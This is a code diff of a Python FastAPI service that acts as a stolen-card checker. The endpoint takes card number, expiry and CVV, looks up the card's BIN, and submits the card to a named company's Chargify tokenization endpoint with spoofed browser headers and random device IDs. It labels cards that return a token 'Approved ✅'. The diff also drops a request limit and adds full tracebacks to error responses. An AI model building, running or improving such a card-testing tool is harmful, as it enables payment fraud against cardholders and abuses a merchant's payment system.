@@ -1,43 +1,14 @@
 from curl_cffi import requests
 import hashlib, os, random
-from fastapi import FastAPI, Request, HTTPException, status, Depends, APIRouter
+from fastapi import Request, HTTPException, APIRouter
+from browserforge.headers import HeaderGenerator
 from faker import Faker
 from bs4 import BeautifulSoup
 import traceback
-from faker import Faker
-from browserforge.headers import HeaderGenerator
-import asyncio
 
-fake = Faker("en_US")
+# Initialize Faker instance
+fake = Faker()
 
-
-
-
-
-def generate_random_email():
-    domains = ["gmail.com"]
-    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=26))
-    domain = random.choice(domains)
-    return f"{name}@{domain}"
-# Global request counter - simple and effective
-REQUEST_LIMIT = 5000
-request_count = 0
-
-async def limit_requests():
-    """
-    Simple dependency that tracks global request count
-    """
-    global request_count
-    
-    if request_count >= REQUEST_LIMIT:
-        raise HTTPException(
-            status_code=status.HTTP_429_TOO_MANY_REQUESTS,
-            detail=f"Request limit of {REQUEST_LIMIT} reached. Current count: {request_count}"
-        )
-    
-    request_count += 1
-    print(f"Request count: {request_count}/{REQUEST_LIMIT}")  # Debug logging
-    
 def generate_random_device_id():
     return hashlib.sha256(os.urandom(32)).hexdigest()[:random.randint(8, 36)]
 
@@ -49,42 +20,31 @@ def cap(string: str, start: str, end: str) -> str:
     except IndexError:
         return None
 
-# Create the router with dependency
-auth_check = APIRouter(
-    prefix="/auth_check",
-    dependencies=[Depends(limit_requests)]
-)
+# Create the router WITHOUT counter dependency (handled in main)
+auth_check = APIRouter(prefix="/auth_check")
 
-# Optional: Add an endpoint to check current count
-@auth_check.get("/status")
-async def get_status():
-    """Get current request count status"""
-    global request_count
-    return {
-        "current_count": request_count,
-        "limit": REQUEST_LIMIT,
-        "remaining": REQUEST_LIMIT - request_count
-    }
-
-# Optional: Reset counter (for testing)
-@auth_check.post("/reset")
-async def reset_counter():
-    """Reset the request counter"""
-    global request_count
-    request_count = 0
-    return {"message": "Counter reset", "current_count": request_count}
-
+# Main tokenization endpoint at /auth_check/
 @auth_check.get("/")
 async def tokenize_card(request: Request):
     try:
-        lista = request.query_params.get('lista').split('|')
-        cc = lista[0]
-        mm = lista[1]
-        yy = lista[2]
-        cv = lista[3]
-        # First get bin info
-        bin_response = requests.get(f'https://api.juspay.in/cardbins/{cc[:6]}')
-        bin_data = bin_response.json()
+        lista = request.query_params.get('lista')
+        if not lista:
+            raise HTTPException(status_code=400, detail="Missing 'lista' parameter")
+            
+        lista = lista.split('|')
+        if len(lista) != 4:
+            raise HTTPException(status_code=400, detail="Invalid lista format. Expected: cc|mm|yy|cv")
+            
+        cc, mm, yy, cv = lista
+        
+        # First get bin info with timeout
+        try:
+            bin_response = requests.get(f'https://api.juspay.in/cardbins/{cc[:6]}', timeout=10)
+            bin_data = bin_response.json()
+        except Exception as e:
+            print(f"BIN lookup failed: {e}")
+            bin_data = {}
+            
         brand = bin_data.get('brand', '').lower()
         country = bin_data.get('country', '').lower()
         card_subtype = bin_data.get('card_sub_type', '').lower()
@@ -156,16 +116,17 @@ async def tokenize_card(request: Request):
         final_hash = hashlib.sha1(joined.encode('utf-8')).hexdigest()
         json_data['h'] = final_hash
 
-        # Make the request
+        # Make the request with timeout
         response = sess.post(
             'https://tiny-technologies.chargify.com/js/tokens.json',
             headers=headers,
-            json=json_data
+            json=json_data,
+            timeout=30
         )
         response_data = response.json()
         print(response_data)
 
-        if response_data.get('token'):  # Checks if token exists and is not None/empty
+        if response_data.get('token'):
             return {
                 "card": f"{cc}|{mm}|{yy}|{cv}",
                 "status": "Approved ✅",
@@ -185,10 +146,11 @@ async def tokenize_card(request: Request):
             }
 
     except Exception as e:
-        return{
-                "card": f"{cc}|{mm}|{yy}|{cv}",
-                "status": "API Error ⚠️",
-                "message": "Recheck",
-                "cvc/avs": f"0",
-                "code": f"0",
-            }
+        return {
+            "card": f"{cc}|{mm}|{yy}|{cv}",
+            "status": "API Error ⚠️",
+            "message": "Recheck",
+            "cvc/avs": f"0",
+            "code": f"0",
+            "traceback": str(traceback.format_exc())
+        }
